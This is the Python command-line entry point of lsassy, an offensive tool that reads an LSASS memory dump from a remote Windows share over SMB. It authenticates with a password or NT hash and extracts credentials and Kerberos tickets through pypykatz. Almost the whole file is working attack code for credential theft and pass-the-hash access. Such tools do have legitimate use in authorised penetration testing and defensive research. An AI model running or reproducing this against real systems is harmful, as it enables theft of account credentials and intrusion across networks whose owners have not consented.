#!/usr/bin/env python3
#
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import pkg_resources
import sys
from pypykatz.pypykatz import pypykatz
from lsassy.impacketconnection import ImpacketConnection
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser

version = pkg_resources.require("lsassy")[0].version


def run():
    import argparse
    parser = argparse.ArgumentParser(description='lsassy v{} - Remote lsass dump reader'.format(version))
    group_auth = parser.add_argument_group('Authentication')
    group_auth.add_argument('--hashes', action='store', help='[LM:]NT hash')
    group_out = parser.add_argument_group('Output')
    group_out.add_argument('-j', '--json', action='store_true',help='Print credentials in JSON format')
    group_out.add_argument('-k', '--kerberos-dir', help='Save kerberos tickets to a directory.')
    group_out.add_argument('-g', '--grep', action='store_true', help='Print credentials in greppable format')
    group_out.add_argument('-o', '--outfile', help='Save results to file')
    parser.add_argument('-r', '--raw', action='store_true', help='Raw results without filtering')
    parser.add_argument('-d', '--debug', action='store_true', help='Debug output')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
    parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>:/share_name/path/to/lsass/dump')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()
    conn, share_name, file_path = ImpacketConnection.from_args(args, args.debug)

    ifile = ImpacketFile()
    ifile.open(conn, share_name, file_path)
    dumpfile = pypykatz.parse_minidump_external(ifile)
    parser = Parser(dumpfile)
    parser.output(args)
    

if __name__ == '__main__':
    run()
